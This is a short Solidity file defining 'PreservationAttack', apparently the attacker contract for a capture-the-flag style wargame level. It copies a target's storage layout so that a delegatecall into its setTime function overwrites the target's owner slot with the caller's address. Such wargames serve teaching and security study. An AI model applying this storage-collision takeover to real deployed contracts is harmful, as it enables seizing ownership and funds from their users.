pragma solidity ^0.6.0;

contract PreservationAttack { 
    address public timeZone1Library;   // slot 0
    address public timeZone2Library;   // slot 1
    address public theOwner;              // slot 2
    uint storedTime;

    function setTime(uint _time) public { 
        theOwner = msg.sender;
    }







}

